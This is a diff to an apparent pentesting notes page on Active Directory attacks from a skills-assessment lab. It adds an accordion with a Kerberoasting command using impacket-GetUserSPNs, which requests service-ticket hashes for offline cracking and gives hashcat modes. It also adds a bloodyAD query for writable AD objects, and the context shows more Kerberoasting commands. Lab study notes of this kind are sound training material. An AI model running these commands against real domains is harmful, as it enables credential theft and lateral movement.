@@ -50,9 +50,32 @@ impacket-GetUserSPNs 'DOMAIN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile ti
 
 ## Notebook recipes
 
-10 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
+11 additional examples, grouped by task. Saved as written; prompts, output, original lab values and older syntax may be included.
 
 <AccordionGroup>
+
+<Accordion title="Step 3: Roasting, Outbound ACL Chain &amp; Lateral Movement">
+
+### Step 3: Roasting, Outbound ACL Chain & Lateral Movement
+
+**AD Enumeration & Attacks: Skills Assessment Hub**
+
+```bash
+# Kerberoast SPN accounts & check encryption type ($krb5tgs$23$ -> -m 13100, $18$ -> -m 19700)
+impacket-GetUserSPNs 'DOMAIN_FQDN/USER:PASSWORD' -dc-ip DC_IP -request -outputfile part1-kerb.hash
+
+# Fast CLI check for writable AD objects from your current user
+bloodyAD --host DC_IP -d DOMAIN_FQDN -u USER -p 'PASSWORD' get writable
+```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [AD Enumeration & Attacks: Skills Assessment Hub — Step 3: Roasting, Outbound ACL Chain & Lateral Movement](/active-directory/assessment#step-3-roasting-outbound-acl-chain-&-lateral-movement)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
+</Accordion>
 
 <Accordion title="Kerberos / Spns">
 
@@ -310,6 +333,8 @@ nxc ldap $DC -u USER -p PASS --kerberoasting kerb.hash
 - [Official documentation 1](https://github.com/fortra/impacket/blob/master/examples/GetUserSPNs.py)
 
 {/* VAULT_RELATED_START */}
+
+---
 
 **Source material and related references**
 
